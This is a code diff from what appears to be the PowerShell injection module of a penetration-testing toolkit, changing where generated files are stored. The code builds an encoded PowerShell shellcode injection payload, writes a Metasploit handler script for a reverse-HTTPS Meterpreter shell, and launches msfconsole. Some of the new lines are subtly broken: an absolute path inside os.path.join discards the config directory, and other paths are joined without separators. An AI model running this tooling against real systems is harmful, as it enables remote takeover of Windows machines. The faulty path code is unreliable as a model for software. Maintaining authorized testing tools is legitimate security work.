@@ -68,7 +68,7 @@ try:
     if port == "":
         port = "443"
     core.update_options("PORT={0}".format(port))
-    with open(os.path.join(core.setdir + "/payload_options.shellcode"), "w") as filewrite:
+    with open(os.path.join(core.userconfigpath, "/payload_options.shellcode"), "w") as filewrite:
         # format needed for shellcode generation
         filewrite.write("{0} {1},".format(payload, port))
     core.update_options("POWERSHELL_SOLO=ON")
@@ -80,20 +80,20 @@ try:
         import src.payloads.powershell.prep
 
     # create the directory if it does not exist
-    if not os.path.isdir(os.path.join(core.setdir + "reports/powershell")):
-        os.makedirs(os.path.join(core.setdir + "reports/powershell"))
+    if not os.path.isdir(os.path.join(core.userconfigpath, "reports/powershell")):
+        os.makedirs(os.path.join(core.userconfigpath, "reports/powershell"))
 
-    x86 = open(core.setdir + "x86.powershell", "r").read()
+    x86 = open(core.userconfigpath + "x86.powershell", "r").read()
     x86 = core.powershell_encodedcommand(x86) 
-    core.print_status("If you want the powershell commands and attack, they are exported to {0}".format(os.path.join(core.setdir + "reports/powershell")))
-    filewrite = file(core.setdir + "/reports/powershell/x86_powershell_injection.txt", "w")
+    core.print_status("If you want the powershell commands and attack, they are exported to {0}".format(os.path.join(core.userconfigpath, "reports/powershell")))
+    filewrite = file(core.userconfigpath + "reports/powershell/x86_powershell_injection.txt", "w")
     filewrite.write(x86)
     filewrite.close()
     payload = "windows/meterpreter/reverse_https\n"  # if we are using x86
     command = x86  # assign powershell to command
 
     # write out our answer file for the powershell injection attack
-    with open(core.setdir + "/reports/powershell/powershell.rc", "w") as filewrite:
+    with open(core.userconfigpath + "reports/powershell/powershell.rc", "w") as filewrite:
         filewrite.write("use multi/handler\n"
                         "set payload windows/meterpreter/reverse_https\n"
                         "set LPORT {0}\n"
@@ -113,7 +113,7 @@ try:
     # launch metasploit below
     core.print_status("Launching Metasploit.. This may take a few seconds.")
     subprocess.Popen("{0} -r {1}".format(os.path.join(core.meta_path() + "msfconsole"),
-                                         os.path.join(core.setdir + "reports/powershell/powershell.rc")),
+                                         os.path.join(core.userconfigpath, "reports/powershell/powershell.rc")),
                      shell=True).wait()
 
 # handle exceptions
